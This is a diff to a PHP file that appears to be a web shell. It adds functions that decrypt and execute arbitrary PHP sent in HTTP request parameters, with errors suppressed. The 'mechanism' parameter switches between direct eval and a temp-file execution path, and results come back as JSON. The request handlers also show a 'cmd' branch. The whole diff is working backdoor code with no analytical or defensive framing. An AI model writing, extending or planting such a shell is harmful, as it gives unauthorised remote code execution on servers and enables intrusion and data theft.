@@ -191,6 +191,14 @@ function get_user()
     }
     return getenv('USERNAME') ? getenv('USERNAME') : getenv('USER');
 }
+function simple_eval($code)
+{
+    ob_start();
+    @eval($code);
+    $output = ob_get_contents();
+    ob_get_clean();
+    return $output;
+}
 function better_eval($code)
 {
     $temp = tmpfile();
@@ -206,6 +214,22 @@ function better_eval($code)
         unlink($file);
     }
     return $output;
+}
+function do_eval($code, $mech = 'auto')
+{
+    switch ($mech) {
+        case 'auto':
+            if (@eval('return true;')) {
+                return do_eval($code, 'eval');
+            }
+            return do_eval($code, 'tempfile');
+        case 'eval':
+            return simple_eval($code);
+
+        case 'tempfile':
+            return better_eval($code);
+    }
+    return false;
 }
 
 /**
@@ -258,9 +282,10 @@ if (isset($_REQUEST['cmd'])) {
  * PHP Eval
  */
 if (isset($_REQUEST['eval'])) {
+    $mech = $_REQUEST['mechanism'] ? $_REQUEST['mechanism'] : 'auto';
     $code = decrypt($_REQUEST['eval']);
     $t1 = microtime(true);
-    $output = better_eval($code);
+    $output = do_eval($code, $mech);
     $t2 = microtime(true);
     output_json(array(
         'stdout' => $output,
